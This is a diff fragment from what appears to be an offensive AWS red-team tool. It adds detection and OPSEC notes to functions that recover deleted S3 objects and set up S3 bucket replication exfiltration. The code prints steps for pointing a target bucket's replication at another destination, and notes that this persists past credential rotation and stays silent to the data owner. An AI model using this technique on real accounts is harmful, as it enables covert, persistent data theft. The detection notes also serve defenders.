   output.push(`[+] Total recoverable deleted objects across all buckets: ${totalRecoverable}`)
+
+  output.push(`\n[*] Detection:`)
+  output.push(`  CloudTrail: ListObjectVersions, GetBucketVersioning (per-bucket)`)
+  output.push(`  CloudTrail: DeleteObject (version-specific delete to remove markers — looks like normal deletion)`)
+  output.push(`  OPSEC: listing versions is low-signal alone, but bulk ListObjectVersions across many buckets is unusual`)
+  output.push(`  OPSEC: removing delete markers (restoring files) leaves its own DeleteObject event — auditors may correlate version-specific deletes with no corresponding PutObject`)
+
   return { output: output.join("\n"), findings }
 }
 
@@ -2120,6 +2396,14 @@ export async function s3ReplicationExfil(args: string[], timeout: number): Promi
     output.push(`    3. aws s3api put-bucket-replication --bucket TARGET --replication-configuration ...`)
     output.push(`    4. All new objects auto-replicate — survives individual object cleanup`)
   }
+
+  output.push(`\n[*] Detection:`)
+  output.push(`  CloudTrail: GetBucketReplication (read), PutBucketReplication (write — VERY high-signal)`)
+  output.push(`  CloudTrail: ListBuckets, GetBucketVersioning (enumeration phase)`)
+  output.push(`  GuardDuty: Policy:S3/BucketAnonymousAccessGranted, Exfiltration:S3/MaliciousIPCaller`)
+  output.push(`  OPSEC: PutBucketReplication to cross-account destination is EXTREMELY high-signal`)
+  output.push(`  OPSEC: replication is PERSISTENT — survives credential rotation, individual object deletion, even bucket policy changes unless the replication rule itself is removed`)
+  output.push(`  OPSEC: data exfil via replication is silent to the data owner — no GetObject events, replicated objects appear in destination automatically`)
 
   return { output: output.join("\n"), findings }
 }
